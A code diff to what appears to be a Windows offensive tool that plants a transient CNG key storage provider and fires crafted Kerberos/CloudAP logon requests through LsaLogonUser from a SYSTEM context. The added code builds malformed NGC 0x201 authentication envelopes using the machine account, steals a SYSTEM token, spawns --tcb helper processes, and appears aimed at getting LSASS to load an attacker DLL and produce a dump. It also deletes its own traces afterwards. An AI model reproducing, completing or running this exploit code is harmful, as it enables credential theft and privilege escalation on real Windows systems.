@@ -205,6 +205,22 @@ static int read_status(const wchar_t *status_path, char *buf, DWORD cap)
     return readn > 0;
 }
 
+static int write_ascii_status(const wchar_t *path, const char *text)
+{
+    HANDLE f;
+    DWORD n = 0, written = 0;
+
+    while (text[n])
+        n++;
+    f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+                    FILE_ATTRIBUTE_NORMAL, NULL);
+    if (f == INVALID_HANDLE_VALUE)
+        return 0;
+    WriteFile(f, text, n, &written, NULL);
+    CloseHandle(f);
+    return written == n;
+}
+
 static const char *stage_text(const char *stage)
 {
     if (!lstrcmpA(stage, "createdump"))
@@ -228,17 +244,17 @@ typedef long (WINAPI *lsa_logon_fn)(HANDLE, PLSA_STRING, ULONG, ULONG,
                                     PVOID *, PULONG, PLUID, PNTSTATUS,
                                     ULONG *, void **, PLSA_UNICODE_STRING *);
 
-static unsigned long build_csp(unsigned char *csp, unsigned long cap,
-                               const wchar_t *prov)
+static unsigned long build_csp_ex(unsigned char *csp, unsigned long cap,
+                                  const wchar_t *prov,
+                                  const wchar_t *container)
 {
-    static const wchar_t str1[] = L"";
-    static const wchar_t reader[] = L"";
-    static const wchar_t key[] = L"k";
     unsigned long str_base = 0x28;
-    unsigned long off_str1 = 0, off_reader = 1, off_key = 2, off_csp = 4;
-    unsigned long len = str_base + (off_csp + lstrlenW(prov) + 1) * 2;
+    unsigned long off_str1 = 0, off_reader = 1, off_key = 2, off_csp;
+    unsigned long keylen = lstrlenW(container);
+    unsigned long len = str_base + (off_key + keylen + 1 + lstrlenW(prov) + 1) * 2 + 2;
 
-    if (len > cap)
+    off_csp = off_key + keylen + 1;
+    if (len > cap || (len & 1))
         return 0;
     ZeroMemory(csp, len);
     *(unsigned long *)(csp + 0x00) = len;
@@ -249,12 +265,18 @@ static unsigned long build_csp(unsigned char *csp, unsigned long cap,
     *(unsigned long *)(csp + 0x1C) = off_reader;
     *(unsigned long *)(csp + 0x20) = off_key;
     *(unsigned long *)(csp + 0x24) = off_csp;
-    CopyMemory(csp + str_base + off_str1 * 2, str1, sizeof(str1));
-    CopyMemory(csp + str_base + off_reader * 2, reader, sizeof(reader));
-    CopyMemory(csp + str_base + off_key * 2, key, sizeof(key));
+    CopyMemory(csp + str_base + off_key * 2, container, (keylen + 1) * 2);
     CopyMemory(csp + str_base + off_csp * 2, prov, (lstrlenW(prov) + 1) * 2);
     return len;
 }
+
+static unsigned long build_csp(unsigned char *csp, unsigned long cap,
+                               const wchar_t *prov)
+{
+    return build_csp_ex(csp, cap, prov, L"k");
+}
+
+
 
 static unsigned long build_auth_payload(unsigned char *pl, unsigned long cap,
                                         const wchar_t *prov)
@@ -278,6 +300,107 @@ static unsigned long build_auth_payload(unsigned char *pl, unsigned long cap,
     *(unsigned short *)(pl + 0x18) = 0;
     CopyMemory(pl + off_csp, csp, csp_len);
     return len;
+}
+
+static unsigned long build_envelope_shell(unsigned char *env, unsigned long cap,
+                                          const unsigned char *blob,
+                                          unsigned long blob_len,
+                                          const unsigned char *tail,
+                                          unsigned long tail_len,
+                                          unsigned char flags)
+{
+    unsigned long sub_off = 0x1C;
+    unsigned long data_off = 0x2C;
+    unsigned long key_off, sub_len, total;
+    unsigned char *sub;
+
+    if (!blob_len)
+        return 0;
+    key_off = (data_off + blob_len + 1) & ~1UL;
+    if (!tail_len)
+        tail_len = 2;
+    sub_len = key_off + tail_len;
+    total = sub_off + sub_len;
+    if (total > cap)
+        return 0;
+    ZeroMemory(env, total);
+    *(unsigned short *)(env + 0x00) = (unsigned short)0x1C;
+    *(unsigned short *)(env + 0x02) = (unsigned short)total;
+    CopyMemory(env + 0x04, &PASSPORT_AUTH_GUID, sizeof(GUID));
+    *(unsigned long *)(env + 0x14) = sub_off;
+    *(unsigned short *)(env + 0x18) = (unsigned short)sub_len;
+
+    sub = env + sub_off;
+    *(unsigned short *)(sub + 0x00) = (unsigned short)data_off;
+    *(unsigned short *)(sub + 0x02) = (unsigned short)sub_len;
+    sub[0x08] = flags;
+    *(unsigned long *)(sub + 0x0C) = data_off;
+    *(unsigned short *)(sub + 0x10) = (unsigned short)blob_len;
+    *(unsigned long *)(sub + 0x14) = key_off;
+    *(unsigned short *)(sub + 0x18) = (unsigned short)tail_len;
+    if (tail)
+        CopyMemory(sub + key_off, tail, tail_len);
+    CopyMemory(sub + data_off, blob, blob_len);
+    return total;
+}
+
+static unsigned long build_envelope_201_pin(unsigned char *env, unsigned long cap,
+                                            const wchar_t *prov,
+                                            const wchar_t *pin,
+                                            unsigned char flags)
+{
+    unsigned char csp[512];
+    unsigned long csp_len = build_csp(csp, sizeof(csp), prov);
+    unsigned long pin_len = (lstrlenW(pin) + 1) * 2;
+
+    if (!csp_len)
+        return 0;
+    return build_envelope_shell(env, cap, csp, csp_len,
+                                (const unsigned char *)pin, pin_len, flags);
+}
+
+static unsigned long build_pin_ex2(unsigned char *buf, unsigned long cap,
+                                   const wchar_t *user,
+                                   const wchar_t *domain)
+{
+    unsigned long hdr = 0x30;
+    unsigned long user_len = (lstrlenW(user) + 1) * 2;
+    unsigned long dom_len = (lstrlenW(domain) + 1) * 2;
+    unsigned long user_off, dom_off, total;
+
+    user_off = hdr;
+    dom_off = (user_off + user_len + 1) & ~1UL;
+    total = dom_off + dom_len;
+    if (total > cap)
+        return 0;
+    ZeroMemory(buf, total);
+    *(unsigned long *)(buf + 0x00) = 0x201;
+    *(unsigned short *)(buf + 0x04) = (unsigned short)hdr;
+    *(unsigned long *)(buf + 0x08) = total;
+    *(unsigned long *)(buf + 0x0C) = user_off;
+    *(unsigned short *)(buf + 0x10) = (unsigned short)(user_len - 2);
+    *(unsigned long *)(buf + 0x14) = dom_off;
+    *(unsigned short *)(buf + 0x18) = (unsigned short)(dom_len - 2);
+    *(unsigned long *)(buf + 0x24) = 0;
+    CopyMemory(buf + user_off, user, user_len);
+    CopyMemory(buf + dom_off, domain, dom_len);
+    return total;
+}
+
+static unsigned long build_envelope_201_ex2pin(unsigned char *env, unsigned long cap,
+                                               const wchar_t *prov,
+                                               const wchar_t *user,
+                                               const wchar_t *domain,
+                                               unsigned char flags)
+{
+    unsigned char csp[512];
+    unsigned char pin[512];
+    unsigned long csp_len = build_csp(csp, sizeof(csp), prov);
+    unsigned long pin_len = build_pin_ex2(pin, sizeof(pin), user, domain);
+
+    if (!csp_len || !pin_len)
+        return 0;
+    return build_envelope_shell(env, cap, csp, csp_len, pin, pin_len, flags);
 }
 
 static unsigned long build_ex2_201(unsigned char *buf, unsigned long cap,
@@ -310,7 +433,7 @@ static unsigned long build_ex2_201(unsigned char *buf, unsigned long cap,
     *(unsigned long *)(buf + 0x0C) = user_off;
     *(unsigned short *)(buf + 0x10) = (unsigned short)(sizeof(user) - 2);
     *(unsigned long *)(buf + 0x14) = domain_off;
-    *(unsigned short *)(buf + 0x18) = (unsigned short)(sizeof(domain) - 2);
+    *(unsigned short *)(buf + 0x18) = (unsigned short)(wlen(domain) * 2);
     *(unsigned long *)(buf + 0x1C) = rec_off;
     *(unsigned short *)(buf + 0x20) = (unsigned short)rec_len;
     *(unsigned long *)(buf + 0x24) = 2;
@@ -500,7 +623,267 @@ static int run_as_system(const wchar_t *cmdline, DWORD *child_rc)
     return ret;
 }
 
-static int tcb_child(const wchar_t *prov)
+static unsigned long build_ex2_with(unsigned char *buf, unsigned long cap,
+                                    const unsigned char *env,
+                                    unsigned long env_len_in,
+                                    const wchar_t *authority,
+                                    const wchar_t *domain_in)
+{
+    static const wchar_t azure[] = L"AzureAD";
+    const wchar_t *domain = domain_in && domain_in[0] ? domain_in : azure;
+    unsigned long hdr = 0x30;
+    unsigned long auth_len = (lstrlenW(authority) + 1) * 2;
+    unsigned long auth_off, dom_off, env_off, total;
+    unsigned long env_len = env_len_in;
+    if (!env_len)
+        return 0;
+    auth_off = hdr;
+    dom_off = (auth_off + auth_len + 1) & ~1UL;
+    env_off = (dom_off + (wlen(domain) + 1) * 2 + 7) & ~7UL;
+    total = env_off + env_len;
+    if (total + 8 > cap)
+        return 0;
+    ZeroMemory(buf, total + 8);
+
+    *(unsigned long *)(buf + 0x00) = 0x201;
+    *(unsigned short *)(buf + 0x04) = (unsigned short)hdr;
+    *(unsigned long *)(buf + 0x08) = total;
+    *(unsigned long *)(buf + 0x0C) = auth_off;
+    *(unsigned short *)(buf + 0x10) = (unsigned short)(auth_len - 2);
+    *(unsigned long *)(buf + 0x14) = dom_off;
+    *(unsigned short *)(buf + 0x18) = (unsigned short)(wlen(domain) * 2);
+    *(unsigned long *)(buf + 0x1C) = env_off;
+    *(unsigned short *)(buf + 0x20) = (unsigned short)env_len;
+    *(unsigned long *)(buf + 0x24) = 2;
+    *(unsigned long *)(buf + 0x28) = 0;
+    *(unsigned short *)(buf + 0x2C) = 0;
+    CopyMemory(buf + auth_off, authority, auth_len);
+    CopyMemory(buf + dom_off, domain, (wlen(domain) + 1) * 2);
+    CopyMemory(buf + env_off, env, env_len);
+    return total;
+}
+
+static void join_authority(wchar_t *outp, DWORD cap)
+{
+    static const wchar_t fb[] = L"organizations";
+    HKEY root, sub;
+    wchar_t name[128];
+    DWORD name_len = 128, type = 0, size = cap * 2;
+    DWORD i;
+
+    for (i = 0; i < (DWORD)wlen(fb); i++)
+        outp[i] = fb[i];
+    outp[wlen(fb)] = 0;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+                      L"SYSTEM\\CurrentControlSet\\Control\\CloudDomainJoin\\JoinInfo",
+                      0, KEY_ENUMERATE_SUB_KEYS, &root) != ERROR_SUCCESS)
+        return;
+    if (RegEnumKeyExW(root, 0, name, &name_len, NULL, NULL, NULL, NULL)
+            == ERROR_SUCCESS &&
+        RegOpenKeyExW(root, name, 0, KEY_QUERY_VALUE, &sub) == ERROR_SUCCESS) {
+        if (RegQueryValueExW(sub, L"TenantName", NULL, &type, (LPBYTE)outp,
+                             &size) != ERROR_SUCCESS || type != REG_SZ)
+            outp[0] = 0;
+        RegCloseKey(sub);
+    }
+    RegCloseKey(root);
+    if (!outp[0]) {
+        for (i = 0; i < (DWORD)wlen(fb); i++)
+            outp[i] = fb[i];
+        outp[wlen(fb)] = 0;
+    }
+}
+
+static void report_status(const wchar_t *ws_path, unsigned long st,
+                          unsigned long sub)
+{
+    char line[48];
+
+    if (!ws_path)
+        return;
+    (void)sprintf(line, "st=%08lX sub=%08lX\n", st, sub);
+    write_ascii_status(ws_path, line);
+}
+
+static unsigned long build_ex2_envelope(unsigned char *buf, unsigned long cap,
+                                        const wchar_t *prov,
+                                        const wchar_t *authority,
+                                        const wchar_t *domain_in)
+{
+    unsigned char env[768];
+    unsigned long env_len = build_envelope_201_pin(env, sizeof(env), prov, L"", 4);
+
+    if (!env_len)
+        return 0;
+    return build_ex2_with(buf, cap, env, env_len, authority, domain_in);
+}
+
+
+
+static int kinit201_child(const wchar_t *prov, const wchar_t *ws_path)
+{
+    unsigned char ex2[2048];
+    unsigned long ex2_len;
+    HANDLE lsa = NULL;
+    NTSTATUS st, sub = 0;
+    ULONG pkg = 0, prof_len = 0, toktype = 0;
+    void *tokinfo = NULL, *profile = NULL;
+    LUID logonid;
+    TOKEN_GROUPS groups;
+    LSA_STRING origin, pkgname, lp;
+    LSA_UNICODE_STRING upn;
+    PLSA_UNICODE_STRING account = NULL;
+    lsa_logon_fn logon_fn;
+    wchar_t dom_w[18];
+    unsigned long i;
+
+    for (i = 0; i < 18; i++)
+        dom_w[i] = 0;
+
+    {
+        typedef struct {
+            LSA_UNICODE_STRING name;
+            void *sid;
+        } policy_domain_t;
+        typedef struct {
+            unsigned long len;
+            void *root;
+            void *objname;
+            unsigned long attrs;
+            void *sd;
+            void *sqos;
+        } lsa_oa_t;
+        typedef long (WINAPI *open_policy_fn)(void *, lsa_oa_t *, unsigned long,
+                                              void **);
+        typedef long (WINAPI *query_policy_fn)(void *, unsigned long, void **);
+        typedef unsigned long (WINAPI *close_fn)(void *);
+        HMODULE adv = GetModuleHandleW(L"advapi32.dll");
+        open_policy_fn open_policy;
+        query_policy_fn query_policy;
+        close_fn close_obj;
+        policy_domain_t *pd = NULL;
+        lsa_oa_t oa;
+        void *pol = NULL;
+        long qs = -1;
+        unsigned long cls;
+
+        open_policy = (open_policy_fn)(void *)GetProcAddress(
+            adv, "LsaOpenPolicy");
+        query_policy = (query_policy_fn)(void *)GetProcAddress(
+            adv, "LsaQueryInformationPolicy");
+        close_obj = (close_fn)(void *)GetProcAddress(adv, "LsaClose");
+        ZeroMemory(&oa, sizeof(oa));
+        oa.len = (unsigned long)sizeof(oa);
+        if (open_policy && !open_policy(NULL, &oa, 1, &pol) && pol) {
+                for (cls = 3; cls <= 12 && !dom_w[0]; cls += 9) {
+                pd = NULL;
+                qs = query_policy ? query_policy(pol, cls, (void **)&pd) : -1L;
+                if (qs == 0 && pd && pd->name.Buffer && pd->name.Length &&
+                    pd->name.Length <= 32) {
+                    for (i = 0; i < pd->name.Length / 2 && i < 17; i++)
+                        dom_w[i] = pd->name.Buffer[i];
+                    dom_w[i] = 0;
+                }
+                if (pd)
+                    LsaFreeReturnBuffer(pd);
+            }
+            if (close_obj)
+                close_obj(pol);
+        }
+        {
+            typedef int (WINAPI *gcn_fn)(unsigned long, wchar_t *, unsigned long *);
+            gcn_fn gcn;
+
+            gcn = (gcn_fn)(void *)GetProcAddress(
+                GetModuleHandleW(L"kernel32.dll"), "GetComputerNameExW");
+            if (gcn) {
+                wchar_t dns[64];
+                unsigned long dl = 63;
+
+                ZeroMemory(dns, sizeof(dns));
+                if (gcn(2, dns, &dl) && dns[0]) {
+                    for (i = 0; i < 17 && dns[i]; i++)
+                        dom_w[i] = dns[i];
+                    dom_w[i] = 0;
+                }
+            }
+        }
+    }
+
+    ZeroMemory(&lp, sizeof(lp));
+    lp.Buffer = (char *)"svclnk";
+    lp.Length = 6;
+    lp.MaximumLength = 7;
+    st = LsaRegisterLogonProcess(&lp, &lsa, (ULONG *)&prof_len);
+    if (st != 0)
+        return 2;
+    if (!dom_w[0]) {
+        LsaDeregisterLogonProcess(lsa);
+        return 5;
+    }
+    ZeroMemory(&pkgname, sizeof(pkgname));
+    pkgname.Buffer = (char *)"Kerberos";
+    pkgname.Length = 8;
+    pkgname.MaximumLength = 9;
+    st = LsaLookupAuthenticationPackage(lsa, &pkgname, &pkg);
+    if (st != 0) {
+        LsaDeregisterLogonProcess(lsa);
+        return 3;
+    }
+
+    ZeroMemory(&origin, sizeof(origin));
+    origin.Buffer = (char *)"svclnk";
+    origin.Length = 6;
+    origin.MaximumLength = 7;
+    ZeroMemory(&groups, sizeof(groups));
+    ZeroMemory(&upn, sizeof(upn));
+    logon_fn = (lsa_logon_fn)(void *)GetProcAddress(
+        GetModuleHandleW(L"secur32.dll"), "LsaLogonUser");
+    if (!logon_fn) {
+        LsaDeregisterLogonProcess(lsa);
+        return 4;
+    }
+
+    {
+        unsigned char env[768];
+        unsigned long env_len;
+        unsigned long m;
+        wchar_t mach[18];
+
+        for (m = 0; m < 18; m++)
+            mach[m] = 0;
+        m = 17;
+        GetComputerNameW(mach, &m);
+        mach[m] = L'$';
+        mach[m + 1] = 0;
+
+        env_len = build_envelope_201_ex2pin(env, sizeof(env), prov, mach,
+                                            dom_w, 4);
+        ex2_len = env_len ? build_ex2_with(ex2, sizeof(ex2), env, env_len,
+                                           mach, dom_w) : 0;
+    }
+    if (!ex2_len) {
+        LsaDeregisterLogonProcess(lsa);
+        return 4;
+    }
+
+    st = logon_fn(lsa, &origin, Network, pkg, ex2, ex2_len,
+                  &groups, &upn, &profile, &prof_len, &logonid,
+                  &sub, &toktype, &tokinfo, &account);
+    out(L"[*] --tcb: kerberos ngc 0x201 (device) -> 0x%08lX sub 0x%08lX\n",
+        (unsigned long)st, (unsigned long)sub);
+    report_status(ws_path, (unsigned long)st, (unsigned long)sub);
+    if (profile)
+        LsaFreeReturnBuffer(profile);
+    if (tokinfo)
+        LsaFreeReturnBuffer(tokinfo);
+    if (account)
+        LsaFreeReturnBuffer(account);
+    LsaDeregisterLogonProcess(lsa);
+    return 0;
+}
+
+static int tcb_child(const wchar_t *prov, const wchar_t *ws_path, int variant)
 {
     unsigned char ex2[2048];
     unsigned long ex2_len;
@@ -515,14 +898,20 @@ static int tcb_child(const wchar_t *prov)
     PLSA_UNICODE_STRING account = NULL;
     lsa_logon_fn logon_fn;
 
-    ex2_len = build_ex2_201(ex2, sizeof(ex2), prov);
+    if (variant == 1) {
+        wchar_t authority[64];
+        join_authority(authority, 64);
+        ex2_len = build_ex2_envelope(ex2, sizeof(ex2), prov, authority, NULL);
+    } else {
+        ex2_len = build_ex2_201(ex2, sizeof(ex2), prov);
+    }
     if (!ex2_len)
         return 4;
 
     ZeroMemory(&lp, sizeof(lp));
-    lp.Buffer = (char *)"insider";
-    lp.Length = 7;
-    lp.MaximumLength = 8;
+    lp.Buffer = (char *)"svclnk";
+    lp.Length = 6;
+    lp.MaximumLength = 7;
     st = LsaRegisterLogonProcess(&lp, &lsa, (ULONG *)&prof_len);
     if (st != 0)
         return 2;
@@ -538,9 +927,9 @@ static int tcb_child(const wchar_t *prov)
     }
 
     ZeroMemory(&origin, sizeof(origin));
-    origin.Buffer = (char *)"insider";
-    origin.Length = 7;
-    origin.MaximumLength = 8;
+    origin.Buffer = (char *)"svclnk";
+    origin.Length = 6;
+    origin.MaximumLength = 7;
     ZeroMemory(&groups, sizeof(groups));
     ZeroMemory(&upn, sizeof(upn));
 
@@ -553,7 +942,14 @@ static int tcb_child(const wchar_t *prov)
     st = logon_fn(lsa, &origin, Interactive, pkg, ex2, ex2_len,
                   &groups, &upn, &profile, &prof_len, &logonid,
                   &sub, &toktype, &tokinfo, &account);
-    (void)st;
+    out(L"[*] --tcb: LsaLogonUser -> 0x%08lX sub 0x%08lX\n",
+        (unsigned long)st, (unsigned long)sub);
+    if (ws_path) {
+        char line[40];
+        (void)sprintf(line, "st=%08lX sub=%08lX\n",
+                      (unsigned long)st, (unsigned long)sub);
+        write_ascii_status(ws_path, line);
+    }
     if (profile)
         LsaFreeReturnBuffer(profile);
     if (tokinfo)
@@ -564,24 +960,36 @@ static int tcb_child(const wchar_t *prov)
     return 0;
 }
 
-static int cng_fire_trigger(const wchar_t *prov)
+static int cng_fire_trigger(const wchar_t *prov, const wchar_t *ws_path,
+                            int variant)
 {
-    wchar_t self[MAX_PATH_W], cmdline[MAX_PATH_W + 64];
+    wchar_t self[MAX_PATH_W], cmdline[MAX_PATH_W + 160];
+    wchar_t var[8];
     DWORD child_rc = 0;
     int rc;
 
     if (is_system_token()) {
-        int r = tcb_child(prov);
+        int r = variant == 2 ? kinit201_child(prov, ws_path)
+                             : tcb_child(prov, ws_path, variant);
         return r == 0 ? 0 : -20 - r;
     }
 
     if (GetModuleFileNameW(NULL, self, MAX_PATH_W) == 0)
         return -11;
     cmdline[0] = 0;
-    append_w(cmdline, MAX_PATH_W + 64, L"\"");
-    append_w(cmdline, MAX_PATH_W + 64, self);
-    append_w(cmdline, MAX_PATH_W + 64, L"\" --tcb ");
-    append_w(cmdline, MAX_PATH_W + 64, prov);
+    append_w(cmdline, MAX_PATH_W + 160, L"\"");
+    append_w(cmdline, MAX_PATH_W + 160, self);
+    append_w(cmdline, MAX_PATH_W + 160, L"\" --tcb ");
+    append_w(cmdline, MAX_PATH_W + 160, prov);
+    if (ws_path) {
+        append_w(cmdline, MAX_PATH_W + 160, L" \"");
+        append_w(cmdline, MAX_PATH_W + 160, ws_path);
+        append_w(cmdline, MAX_PATH_W + 160, L"\"");
+    }
+    var[0] = L' ';
+    var[1] = L'0' + (wchar_t)variant;
+    var[2] = 0;
+    append_w(cmdline, MAX_PATH_W + 160, var);
 
     rc = run_as_system(cmdline, &child_rc);
     if (rc != 0)
@@ -705,9 +1113,10 @@ static int wait_report(const wchar_t *dump_path, const wchar_t *status_path)
     return 8;
 }
 
-static int cng_shot(const wchar_t *image_leaf)
+static int cng_shot(const wchar_t *image_leaf, const wchar_t *ws_path)
 {
     long rc;
+    int variant, ok = 0;
 
     rc = cng_register(CNG_PROV, image_leaf);
     if (rc != 0) {
@@ -717,21 +1126,64 @@ static int cng_shot(const wchar_t *image_leaf)
     out(L"[*] Provider %ls registered (transient); propagating...\n",
         CNG_PROV);
     Sleep(2500);
-    rc = cng_fire_trigger(CNG_PROV);
+    for (variant = 0; variant <= 2; variant++) {
+        rc = cng_fire_trigger(CNG_PROV, ws_path, variant);
+        if (ws_path) {
+            char rep[64] = {0};
+            if (read_status(ws_path, rep, sizeof(rep)))
+                out(L"[*] Trigger report (wire %d): %hs", variant, rep);
+            DeleteFileW(ws_path);
+        }
+        if (rc != 0) {
+            out(L"[!] Trigger failed, wire %d (stage %ld", variant, rc);
+            if (rc == -1)
+                out(L" — not elevated / SeDebug denied");
+            else if (rc == -2 || rc == -3)
+                out(L" — no SYSTEM source process");
+            else if (rc == -22)
+                out(L" — helper got no SeTcb (not SYSTEM)");
+            out(L").\n");
+        } else {
+            out(L"[*] CloudAP logon trigger fired (wire %d).\n", variant);
+            ok = 1;
+        }
+    }
     cng_unregister(CNG_PROV);
     out(L"[*] Provider registration removed.\n");
+    return ok ? 0 : 5;
+}
+
+static int probe_mode(const wchar_t *image_leaf, const wchar_t *dump_path,
+                      const wchar_t *status_path, const wchar_t *sys32_cfg)
+{
+    typedef long (WINAPI *open_prov_fn)(unsigned long long *,
+                                        const wchar_t *, unsigned long);
+    long rc, st = -1;
+    HMODULE nc;
+    open_prov_fn open_prov = NULL;
+    unsigned long long h = 0;
+
+    rc = cng_register(CNG_PROV, image_leaf);
     if (rc != 0) {
-        out(L"[!] Trigger failed (stage %ld", rc);
-        if (rc == -1)
-            out(L" — not elevated / SeDebug denied");
-        else if (rc == -2 || rc == -3)
-            out(L" — no SYSTEM source process");
-        else if (rc == -22)
-            out(L" — helper got no SeTcb (not SYSTEM)");
-        out(L").\n");
-        return 5;
+        out(L"[!] probe: BCryptRegisterProvider failed (%ld).\n", rc);
+        return 9;
     }
-    out(L"[*] CloudAP logon trigger fired.\n");
+    out(L"[*] probe: provider registered; resolving in this process...\n");
+    nc = LoadLibraryW(L"ncrypt.dll");
+    if (nc)
+        open_prov = (open_prov_fn)(void *)GetProcAddress(
+            nc, "NCryptOpenStorageProvider");
+    if (open_prov)
+        st = open_prov(&h, CNG_PROV, 0);
+    out(L"[*] probe: NCryptOpenStorageProvider(%ls) -> 0x%08lX\n",
+        CNG_PROV, (unsigned long)st);
+    out(L"[*] probe: cng_ksp.dll mapped into this process: %ls\n",
+        GetModuleHandleW(L"cng_ksp.dll") ? L"yes" : L"no");
+    cng_unregister(CNG_PROV);
+    out(L"[*] probe: provider registration removed.\n");
+    DeleteFileW(sys32_cfg);
+    DeleteFileW(dump_path);
+    DeleteFileW(status_path);
     return 0;
 }
 
@@ -759,19 +1211,28 @@ int wmain(int argc, wchar_t **argv)
     wchar_t dump_path[MAX_PATH_W + 16];
     wchar_t status_path[MAX_PATH_W + 32];
     wchar_t sys32_cfg[MAX_PATH_W];
+    wchar_t ws_path[MAX_PATH_W + 16];
     wchar_t cng_img[MAX_PATH_W];
     wchar_t cng_leaf[64];
     wchar_t *tmp = NULL;
     DWORD n;
-    int fresh = 0, dump_arg = 0;
+    int fresh = 0, probe = 0, dump_arg = 0;
     int i, rc;
 
-    if (argc >= 2 && !lstrcmpiW(argv[1], L"--tcb"))
-        return tcb_child(argc >= 3 ? argv[2] : CNG_PROV);
+    if (argc >= 2 && !lstrcmpiW(argv[1], L"--tcb")) {
+        int variant = argc >= 5 ? (int)wcstol(argv[4], NULL, 10) : 0;
+        if (variant == 2)
+            return kinit201_child(argc >= 3 ? argv[2] : CNG_PROV,
+                                  argc >= 4 ? argv[3] : NULL);
+        return tcb_child(argc >= 3 ? argv[2] : CNG_PROV,
+                         argc >= 4 ? argv[3] : NULL, variant);
+    }
 
     for (i = 1; i < argc; i++) {
         if (!lstrcmpiW(argv[i], L"--fresh"))
             fresh = 1;
+        else if (!lstrcmpiW(argv[i], L"--probe"))
+            probe = 1;
         else if (!dump_arg)
             dump_arg = i;
         else {
@@ -819,13 +1280,19 @@ int wmain(int argc, wchar_t **argv)
             return 3;
         }
     } else {
-        if (!join_path(dump_path, MAX_PATH_W + 16, exe_dir, DUMP_LEAF)) {
+        if (!join_path(dump_path, MAX_PATH_W + 16, exe_dir,
+                       probe ? L"cng_probe.dmp" : DUMP_LEAF)) {
             out(L"[!] Path too long.\n");
             return 3;
         }
     }
     status_path_for(dump_path, status_path, MAX_PATH_W + 32);
     DeleteFileW(status_path);
+    if (!join_path(ws_path, MAX_PATH_W + 16, exe_dir, L"cng_trigger.log")) {
+        out(L"[!] Path too long.\n");
+        return 3;
+    }
+    DeleteFileW(ws_path);
 
     out(L"[*] dll   : %ls\n", dll_path);
     out(L"[*] dump  : %ls\n", dump_path);
@@ -880,7 +1347,10 @@ int wmain(int argc, wchar_t **argv)
         return 3;
     }
 
-    rc = cng_shot(cng_leaf);
+    if (probe)
+        return probe_mode(cng_leaf, dump_path, status_path, sys32_cfg);
+
+    rc = cng_shot(cng_leaf, ws_path);
     if (rc != 0)
         return rc;
 
